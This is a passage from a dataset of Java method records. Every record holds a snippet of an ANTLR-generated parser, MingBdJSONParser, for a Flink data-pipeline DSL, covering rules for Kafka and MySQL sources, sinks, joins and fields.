getState());\n\t\tenterRule(_localctx, 24, RULE_col);\n\t\ttry {\n\t\t\tsetState(149);\n\t\t\t_errHandler.sync(this);\n\t\t\tswitch ( getInterpreter().adaptivePredict(_input,8,_ctx) ) {\n\t\t\tcase 1:\n\t\t\t\tenterOuterAlt(_localctx, 1);\n\t\t\t\t{\n\t\t\t\tsetState(144);\n\t\t\t\tmatch(STRING);\n\t\t\t\t}\n\t\t\t\tbreak;\n\t\t\tcase 2:\n\t\t\t\tenterOuterAlt(_localctx, 2);\n\t\t\t\t{\n\t\t\t\tsetState(145);\n\t\t\t\tmatch(STRING);\n\t\t\t\tsetState(146);\n\t\t\t\tmatch(T__18);\n\t\t\t\tsetState(147);\n\t\t\t\tmatch(STRING);\n\t\t\t\tsetState(148);\n\t\t\t\tmatch(T__19);\n\t\t\t\t}\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t\tcatch (RecognitionException re) {\n\t\t\t_localctx.exception = re;\n\t\t\t_errHandler.reportError(this, re);\n\t\t\t_errHandler.recover(this, re);\n\t\t}\n\t\tfinally {\n\t\t\texitRule();\n\t\t}\n\t\treturn _localctx;\n\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "Parser", "implements": null, "modifiers": ["public"]}}, {"id": 56030, "method_name": "filter", "class_name": "MingBdJSONParser", "params": [], "throws": ["RecognitionException"], "modifiers": ["final", "public"], "return_type": "FilterContext", "snippet": "\tpublic final FilterContext filter() throws RecognitionException {\n\t\tFilterContext _localctx = new FilterContext(_ctx, getState());\n\t\tenterRule(_localctx, 26, RULE_filter);\n\t\ttry {\n\t\t\tenterOuterAlt(_localctx, 1);\n\t\t\t{\n\t\t\tsetState(151);\n\t\t\tmatch(T__0);\n\t\t\tsetState(152);\n\t\t\tmatch(T__20);\n\t\t\tsetState(153);\n\t\t\tmatch(T__4);\n\t\t\tsetState(154);\n\t\t\tmatch(STRING);\n\t\t\tsetState(155);\n\t\t\tmatch(T__1);\n\t\t\tsetState(156);\n\t\t\tmatch(T__12);\n\t\t\tsetState(157);\n\t\t\tmatch(T__4);\n\t\t\tsetState(158);\n\t\t\tmatch(STRING);\n\t\t\tsetState(159);\n\t\t\tmatch(T__1);\n\t\t\tsetState(160);\n\t\t\tmatch(T__13);\n\t\t\tsetState(161);\n\t\t\tmatch(T__4);\n\t\t\tsetState(162);\n\t\t\tmatch(STRING);\n\t\t\tsetState(163);\n\t\t\tmatch(T__2);\n\t\t\t}\n\t\t}\n\t\tcatch (RecognitionException re) {\n\t\t\t_localctx.exception = re;\n\t\t\t_errHandler.reportError(this, re);\n\t\t\t_errHandler.recover(this, re);\n\t\t}\n\t\tfinally {\n\t\t\texitRule();\n\t\t}\n\t\treturn _localctx;\n\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "Parser", "implements": null, "modifiers": ["public"]}}, {"id": 56031, "method_name": "save", "class_name": "MingBdJSONParser", "params": [], "throws": ["RecognitionException"], "modifiers": ["final", "public"], "return_type": "SaveContext", "snippet": "\tpublic final SaveContext save() throws RecognitionException {\n\t\tSaveContext _localctx = new SaveContext(_ctx, getState());\n\t\tenterRule(_localctx, 28, RULE_save);\n\t\tint _la;\n\t\ttry {\n\t\t\tenterOuterAlt(_localctx, 1);\n\t\t\t{\n\t\t\tsetState(165);\n\t\t\tmatch(T__21);\n\t\t\tsetState(166);\n\t\t\tmatch(T__4);\n\t\t\tsetState(167);\n\t\t\tmatch(T__8);\n\t\t\tsetState(168);\n\t\t\tsaveInfo();\n\t\t\tsetState(173);\n\t\t\t_errHandler.sync(this);\n\t\t\t_la = _input.LA(1);\n\t\t\twhile (_la==T__1) {\n\t\t\t\t{\n\t\t\t\t{\n\t\t\t\tsetState(169);\n\t\t\t\tmatch(T__1);\n\t\t\t\tsetState(170);\n\t\t\t\tsaveInfo();\n\t\t\t\t}\n\t\t\t\t}\n\t\t\t\tsetState(175);\n\t\t\t\t_errHandler.sync(this);\n\t\t\t\t_la = _input.LA(1);\n\t\t\t}\n\t\t\tsetState(176);\n\t\t\tmatch(T__9);\n\t\t\t}\n\t\t}\n\t\tcatch (RecognitionException re) {\n\t\t\t_localctx.exception = re;\n\t\t\t_errHandler.reportError(this, re);\n\t\t\t_errHandler.recover(this, re);\n\t\t}\n\t\tfinally {\n\t\t\texitRule();\n\t\t}\n\t\treturn _localctx;\n\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "Parser", "implements": null, "modifiers": ["public"]}}, {"id": 56032, "method_name": "saveInfo", "class_name": "MingBdJSONParser", "params": [], "throws": ["RecognitionException"], "modifiers": ["final", "public"], "return_type": "SaveInfoContext", "snippet": "\tpublic final SaveInfoContext saveInfo() throws RecognitionException {\n\t\tSaveInfoContext _localctx = new SaveInfoContext(_ctx, getState());\n\t\tenterRule(_localctx, 30, RULE_saveInfo);\n\t\ttry {\n\t\t\tsetState(180);\n\t\t\t_errHandler.sync(this);\n\t\t\tswitch (_input.LA(1)) {\n\t\t\tcase T__0:\n\t\t\t\tenterOuterAlt(_localctx, 1);\n\t\t\t\t{\n\t\t\t\tsetState(178);\n\t\t\t\tkafkaSave();\n\t\t\t\t}\n\t\t\t\tbreak;\n\t\t\tcase T__1:\n\t\t\tcase T__9:\n\t\t\t\tenterOuterAlt(_localctx, 2);\n\t\t\t\t{\n\t\t\t\tsetState(179);\n\t\t\t\tmysqlSave();\n\t\t\t\t}\n\t\t\t\tbreak;\n\t\t\tdefault:\n\t\t\t\tthrow new NoViableAltException(this);\n\t\t\t}\n\t\t}\n\t\tcatch (RecognitionException re) {\n\t\t\t_localctx.exception = re;\n\t\t\t_errHandler.reportError(this, re);\n\t\t\t_errHandler.recover(this, re);\n\t\t}\n\t\tfinally {\n\t\t\texitRule();\n\t\t}\n\t\treturn _localctx;\n\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "Parser", "implements": null, "modifiers": ["public"]}}, {"id": 56033, "method_name": "kafkaSave", "class_name": "MingBdJSONParser", "params": [], "throws": ["RecognitionException"], "modifiers": ["final", "public"], "return_type": "KafkaSaveContext", "snippet": "\tpublic final KafkaSaveContext kafkaSave() throws RecognitionException {\n\t\tKafkaSaveContext _localctx = new KafkaSaveContext(_ctx, getState());\n\t\tenterRule(_localctx, 32, RULE_kafkaSave);\n\t\ttry {\n\t\t\tenterOuterAlt(_localctx, 1);\n\t\t\t{\n\t\t\tsetState(182);\n\t\t\tmatch(T__0);\n\t\t\tsetState(183);\n\t\t\tmatch(T__22);\n\t\t\tsetState(184);\n\t\t\tmatch(T__4);\n\t\t\tsetState(185);\n\t\t\tmatch(STRING);\n\t\t\tsetState(186);\n\t\t\tmatch(T__1);\n\t\t\tsetState(187);\n\t\t\tmatch(T__23);\n\t\t\tsetState(188);\n\t\t\tmatch(T__4);\n\t\t\tsetState(189);\n\t\t\tmatch(STRING);\n\t\t\tsetState(190);\n\t\t\tmatch(T__1);\n\t\t\tsetState(191);\n\t\t\tmatch(T__24);\n\t\t\tsetState(192);\n\t\t\tmatch(T__4);\n\t\t\tsetState(193);\n\t\t\tmatch(STRING);\n\t\t\tsetState(194);\n\t\t\tmatch(T__1);\n\t\t\tsetState(195);\n\t\t\tmatch(T__12);\n\t\t\tsetState(196);\n\t\t\tmatch(T__4);\n\t\t\tsetState(197);\n\t\t\tmatch(STRING);\n\t\t\tsetState(198);\n\t\t\tmatch(T__1);\n\t\t\tsetState(199);\n\t\t\tcols();\n\t\t\tsetState(200);\n\t\t\tmatch(T__2);\n\t\t\t}\n\t\t}\n\t\tcatch (RecognitionException re) {\n\t\t\t_localctx.exception = re;\n\t\t\t_errHandler.reportError(this, re);\n\t\t\t_errHandler.recover(this, re);\n\t\t}\n\t\tfinally {\n\t\t\texitRule();\n\t\t}\n\t\treturn _localctx;\n\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "Parser", "implements": null, "modifiers": ["public"]}}, {"id": 56034, "method_name": "mysqlSave", "class_name": "MingBdJSONParser", "params": [], "throws": ["RecognitionException"], "modifiers": ["final", "public"], "return_type": "MysqlSaveContext", "snippet": "\tpublic final MysqlSaveContext mysqlSave() throws RecognitionException {\n\t\tMysqlSaveContext _localctx = new MysqlSaveContext(_ctx, getState());\n\t\tenterRule(_localctx, 34, RULE_mysqlSave);\n\t\ttry {\n\t\t\tenterOuterAlt(_localctx, 1);\n\t\t\t{\n\t\t\t}\n\t\t}\n\t\tcatch (RecognitionException re) {\n\t\t\t_localctx.exception = re;\n\t\t\t_errHandler.reportError(this, re);\n\t\t\t_errHandler.recover(this, re);\n\t\t}\n\t\tfinally {\n\t\t\texitRule();\n\t\t}\n\t\treturn _localctx;\n\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "Parser", "implements": null, "modifiers": ["public"]}}, {"id": 56035, "method_name": "joinpair", "class_name": "MingBdJSONParser", "params": [], "throws": ["RecognitionException"], "modifiers": ["final", "public"], "return_type": "JoinpairContext", "snippet": "\tpublic final JoinpairContext joinpair() throws RecognitionException {\n\t\tJoinpairContext _localctx = new JoinpairContext(_ctx, getState());\n\t\tenterRule(_localctx, 36, RULE_joinpair);\n\t\ttry {\n\t\t\tenterOuterAlt(_localctx, 1);\n\t\t\t{\n\t\t\tsetState(204);\n\t\t\tmatch(T__0);\n\t\t\tsetState(205);\n\t\t\tmatch(T__25);\n\t\t\tsetState(206);\n\t\t\tmatch(T__4);\n\t\t\tsetState(207);\n\t\t\tmatch(T__8);\n\t\t\tsetState(208);\n\t\t\tmatch(STRING);\n\t\t\tsetState(209);\n\t\t\tmatch(T__1);\n\t\t\tsetState(210);\n\t\t\tmatch(STRING);\n\t\t\tsetState(211);\n\t\t\tmatch(T__9);\n\t\t\tsetState(212);\n\t\t\tmatch(T__1);\n\t\t\tsetState(213);\n\t\t\tmatch(T__26);\n\t\t\tsetState(214);\n\t\t\tmatch(T__4);\n\t\t\tsetState(215);\n\t\t\tmatch(T__8);\n\t\t\tsetState(216);\n\t\t\tmatch(STRING);\n\t\t\tsetState(217);\n\t\t\tmatch(T__9);\n\t\t\tsetState(218);\n\t\t\tmatch(T__1);\n\t\t\tsetState(219);\n\t\t\tmatch(T__27);\n\t\t\tsetState(220);\n\t\t\tmatch(T__4);\n\t\t\tsetState(221);\n\t\t\tmatch(STRING);\n\t\t\tsetState(222);\n\t\t\tmatch(T__2);\n\t\t\t}\n\t\t}\n\t\tcatch (RecognitionException re) {\n\t\t\t_localctx.exception = re;\n\t\t\t_errHandler.reportError(this, re);\n\t\t\t_errHandler.recover(this, re);\n\t\t}\n\t\tfinally {\n\t\t\texitRule();\n\t\t}\n\t\treturn _localctx;\n\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "Parser", "implements": null, "modifiers": ["public"]}}, {"id": 56036, "method_name": "kafkaSource", "class_name": "MingBdJSONParser", "params": [], "throws": ["RecognitionException"], "modifiers": ["final", "public"], "return_type": "KafkaSourceContext", "snippet": "\tpublic final KafkaSourceContext kafkaSource() throws RecognitionException {\n\t\tKafkaSourceContext _localctx = new KafkaSourceContext(_ctx, getState());\n\t\tenterRule(_localctx, 38, RULE_kafkaSource);\n\t\tint _la;\n\t\ttry {\n\t\t\tenterOuterAlt(_localctx, 1);\n\t\t\t{\n\t\t\tsetState(224);\n\t\t\tmatch(T__0);\n\t\t\tsetState(225);\n\t\t\tmatch(T__22);\n\t\t\tsetState(226);\n\t\t\tmatch(T__4);\n\t\t\tsetState(227);\n\t\t\tmatch(STRING);\n\t\t\tsetState(228);\n\t\t\tmatch(T__1);\n\t\t\tsetState(229);\n\t\t\tmatch(T__23);\n\t\t\tsetState(230);\n\t\t\tmatch(T__4);\n\t\t\tsetState(231);\n\t\t\tmatch(STRING);\n\t\t\tsetState(232);\n\t\t\tmatch(T__1);\n\t\t\tsetState(233);\n\t\t\tmatch(T__24);\n\t\t\tsetState(234);\n\t\t\tmatch(T__4);\n\t\t\tsetState(235);\n\t\t\tmatch(STRING);\n\t\t\tsetState(236);\n\t\t\tmatch(T__1);\n\t\t\tsetState(237);\n\t\t\tmatch(T__28);\n\t\t\tsetState(238);\n\t\t\tmatch(T__4);\n\t\t\tsetState(239);\n\t\t\tmatch(STRING);\n\t\t\tsetState(240);\n\t\t\tmatch(T__1);\n\t\t\tsetState(241);\n\t\t\tmatch(T__29);\n\t\t\tsetState(242);\n\t\t\tmatch(T__4);\n\t\t\tsetState(243);\n\t\t\tmatch(T__8);\n\t\t\tsetState(244);\n\t\t\tfield();\n\t\t\tsetState(249);\n\t\t\t_errHandler.sync(this);\n\t\t\t_la = _input.LA(1);\n\t\t\twhile (_la==T__1) {\n\t\t\t\t{\n\t\t\t\t{\n\t\t\t\tsetState(245);\n\t\t\t\tmatch(T__1);\n\t\t\t\tsetState(246);\n\t\t\t\tfield();\n\t\t\t\t}\n\t\t\t\t}\n\t\t\t\tsetState(251);\n\t\t\t\t_errHandler.sync(this);\n\t\t\t\t_la = _input.LA(1);\n\t\t\t}\n\t\t\tsetState(252);\n\t\t\tmatch(T__9);\n\t\t\tsetState(253);\n\t\t\tmatch(T__1);\n\t\t\tsetState(254);\n\t\t\tmatch(T__30);\n\t\t\tsetState(255);\n\t\t\tmatch(T__4);\n\t\t\tsetState(256);\n\t\t\tmatch(STRING);\n\t\t\tsetState(257);\n\t\t\tmatch(T__2);\n\t\t\t}\n\t\t}\n\t\tcatch (RecognitionException re) {\n\t\t\t_localctx.exception = re;\n\t\t\t_errHandler.reportError(this, re);\n\t\t\t_errHandler.recover(this, re);\n\t\t}\n\t\tfinally {\n\t\t\texitRule();\n\t\t}\n\t\treturn _localctx;\n\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "Parser", "implements": null, "modifiers": ["public"]}}, {"id": 56037, "method_name": "field", "class_name": "MingBdJSONParser", "params": [], "throws": ["RecognitionException"], "modifiers": ["final", "public"], "return_type": "FieldContext", "snippet": "\tpublic final FieldContext field() throws RecognitionException {\n\t\tFieldContext _localctx = new FieldContext(_ctx, getState());\n\t\tenterRule(_localctx, 40, RULE_field);\n\t\ttry {\n\t\t\tenterOuterAlt(_localctx, 1);\n\t\t\t{\n\t\t\tsetState(259);\n\t\t\tmatch(T__0);\n\t\t\tsetState(260);\n\t\t\tmatch(T__31);\n\t\t\tsetState(261);\n\t\t\tmatch(T__4);\n\t\t\tsetState(262);\n\t\t\tmatch(STRING);\n\t\t\tsetState(263);\n\t\t\tmatch(T__1);\n\t\t\tsetState(264);\n\t\t\tmatch(T__32);\n\t\t\tsetState(265);\n\t\t\tmatch(T__4);\n\t\t\tsetState(266);\n\t\t\tmatch(STRING);\n\t\t\tsetState(267);\n\t\t\tmatch(T__2);\n\t\t\t}\n\t\t}\n\t\tcatch (RecognitionException re) {\n\t\t\t_localctx.exception = re;\n\t\t\t_errHandler.reportError(this, re);\n\t\t\t_errHandler.recover(this, re);\n\t\t}\n\t\tfinally {\n\t\t\texitRule();\n\t\t}\n\t\treturn _localctx;\n\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "Parser", "implements": null, "modifiers": ["public"]}}, {"id": 56038, "method_name": "value", "class_name": "JsonContext", "params": [], "throws": null, "modifiers": ["public"], "return_type": "ValueContext", "snippet": "\t\tpublic ValueContext value() {\n\t\t\treturn getRuleContext(ValueContext.class,0);\n\t\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56039, "method_name": "getRuleIndex", "class_name": "JsonContext", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "\t\t@Override public int getRuleIndex() { return RULE_json; }", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56040, "method_name": "enterRule", "class_name": "JsonContext", "params": ["ParseTreeListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t\tpublic void enterRule(ParseTreeListener listener) {\n\t\t\tif ( listener instanceof MingBdJSONListener ) ((MingBdJSONListener)listener).enterJson(this);\n\t\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56041, "method_name": "exitRule", "class_name": "JsonContext", "params": ["ParseTreeListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t\tpublic void exitRule(ParseTreeListener listener) {\n\t\t\tif ( listener instanceof MingBdJSONListener ) ((MingBdJSONListener)listener).exitJson(this);\n\t\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56042, "method_name": "accept", "class_name": "JsonContext", "params": ["ParseTreeVisitor<T>"], "throws": null, "modifiers": ["public"], "return_type": "T", "snippet": "\t\tpublic <T> T accept(ParseTreeVisitor<? extends T> visitor) {\n\t\t\tif ( visitor instanceof MingBdJSONVisitor ) return ((MingBdJSONVisitor<? extends T>)visitor).visitJson(this);\n\t\t\telse return visitor.visitChildren(this);\n\t\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56043, "method_name": "pair", "class_name": "ValueContext", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<PairContext>", "snippet": "\t\tpublic List<PairContext> pair() {\n\t\t\treturn getRuleContexts(PairContext.class);\n\t\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56044, "method_name": "pair", "class_name": "ValueContext", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "PairContext", "snippet": "\t\tpublic PairContext pair(int i) {\n\t\t\treturn getRuleContext(PairContext.class,i);\n\t\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56045, "method_name": "getRuleIndex", "class_name": "ValueContext", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "\t\t@Override public int getRuleIndex() { return RULE_value; }", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56046, "method_name": "enterRule", "class_name": "ValueContext", "params": ["ParseTreeListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t\tpublic void enterRule(ParseTreeListener listener) {\n\t\t\tif ( listener instanceof MingBdJSONListener ) ((MingBdJSONListener)listener).enterValue(this);\n\t\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56047, "method_name": "exitRule", "class_name": "ValueContext", "params": ["ParseTreeListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t\tpublic void exitRule(ParseTreeListener listener) {\n\t\t\tif ( listener instanceof MingBdJSONListener ) ((MingBdJSONListener)listener).exitValue(this);\n\t\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56048, "method_name": "accept", "class_name": "ValueContext", "params": ["ParseTreeVisitor<T>"], "throws": null, "modifiers": ["public"], "return_type": "T", "snippet": "\t\tpublic <T> T accept(ParseTreeVisitor<? extends T> visitor) {\n\t\t\tif ( visitor instanceof MingBdJSONVisitor ) return ((MingBdJSONVisitor<? extends T>)visitor).visitValue(this);\n\t\t\telse return visitor.visitChildren(this);\n\t\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56049, "method_name": "runtype", "class_name": "PairContext", "params": [], "throws": null, "modifiers": ["public"], "return_type": "RuntypeContext", "snippet": "\t\tpublic RuntypeContext runtype() {\n\t\t\treturn getRuleContext(RuntypeContext.class,0);\n\t\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56050, "method_name": "load", "class_name": "PairContext", "params": [], "throws": null, "modifiers": ["public"], "return_type": "LoadContext", "snippet": "\t\tpublic LoadContext load() {\n\t\t\treturn getRuleContext(LoadContext.class,0);\n\t\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56051, "method_name": "join", "class_name": "PairContext", "params": [], "throws": null, "modifiers": ["public"], "return_type": "JoinContext", "snippet": "\t\tpublic JoinContext join() {\n\t\t\treturn getRuleContext(JoinContext.class,0);\n\t\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56052, "method_name": "trans", "class_name": "PairContext", "params": [], "throws": null, "modifiers": ["public"], "return_type": "TransContext", "snippet": "\t\tpublic TransContext trans() {\n\t\t\treturn getRuleContext(TransContext.class,0);\n\t\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56053, "method_name": "save", "class_name": "PairContext", "params": [], "throws": null, "modifiers": ["public"], "return_type": "SaveContext", "snippet": "\t\tpublic SaveContext save() {\n\t\t\treturn getRuleContext(SaveContext.class,0);\n\t\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56054, "method_name": "getRuleIndex", "class_name": "PairContext", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "\t\t@Override public int getRuleIndex() { return RULE_pair; }", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56055, "method_name": "enterRule", "class_name": "PairContext", "params": ["ParseTreeListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t\tpublic void enterRule(ParseTreeListener listener) {\n\t\t\tif ( listener instanceof MingBdJSONListener ) ((MingBdJSONListener)listener).enterPair(this);\n\t\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56056, "method_name": "exitRule", "class_name": "PairContext", "params": ["ParseTreeListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t\tpublic void exitRule(ParseTreeListener listener) {\n\t\t\tif ( listener instanceof MingBdJSONListener ) ((MingBdJSONListener)listener).exitPair(this);\n\t\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56057, "method_name": "accept", "class_name": "PairContext", "params": ["ParseTreeVisitor<T>"], "throws": null, "modifiers": ["public"], "return_type": "T", "snippet": "\t\tpublic <T> T accept(ParseTreeVisitor<? extends T> visitor) {\n\t\t\tif ( visitor instanceof MingBdJSONVisitor ) return ((MingBdJSONVisitor<? extends T>)visitor).visitPair(this);\n\t\t\telse return visitor.visitChildren(this);\n\t\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56058, "method_name": "getRuleIndex", "class_name": "RuntypeContext", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "\t\t@Override public int getRuleIndex() { return RULE_runtype; }", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56059, "method_name": "enterRule", "class_name": "RuntypeContext", "params": ["ParseTreeListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t\tpublic void enterRule(ParseTreeListener listener) {\n\t\t\tif ( listener instanceof MingBdJSONListener ) ((MingBdJSONListener)listener).enterRuntype(this);\n\t\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56060, "method_name": "exitRule", "class_name": "RuntypeContext", "params": ["ParseTreeListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t\tpublic void exitRule(ParseTreeListener listener) {\n\t\t\tif ( listener instanceof MingBdJSONListener ) ((MingBdJSONListener)listener).exitRuntype(this);\n\t\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56061, "method_name": "accept", "class_name": "RuntypeContext", "params": ["ParseTreeVisitor<T>"], "throws": null, "modifiers": ["public"], "return_type": "T", "snippet": "\t\tpublic <T> T accept(ParseTreeVisitor<? extends T> visitor) {\n\t\t\tif ( visitor instanceof MingBdJSONVisitor ) return ((MingBdJSONVisitor<? extends T>)visitor).visitRuntype(this);\n\t\t\telse return visitor.visitChildren(this);\n\t\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56062, "method_name": "dataSource", "class_name": "LoadContext", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<DataSourceContext>", "snippet": "\t\tpublic List<DataSourceContext> dataSource() {\n\t\t\treturn getRuleContexts(DataSourceContext.class);\n\t\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56063, "method_name": "dataSource", "class_name": "LoadContext", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "DataSourceContext", "snippet": "\t\tpublic DataSourceContext dataSource(int i) {\n\t\t\treturn getRuleContext(DataSourceContext.class,i);\n\t\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56064, "method_name": "getRuleIndex", "class_name": "LoadContext", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "\t\t@Override public int getRuleIndex() { return RULE_load; }", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56065, "method_name": "enterRule", "class_name": "LoadContext", "params": ["ParseTreeListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t\tpublic void enterRule(ParseTreeListener listener) {\n\t\t\tif ( listener instanceof MingBdJSONListener ) ((MingBdJSONListener)listener).enterLoad(this);\n\t\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56066, "method_name": "exitRule", "class_name": "LoadContext", "params": 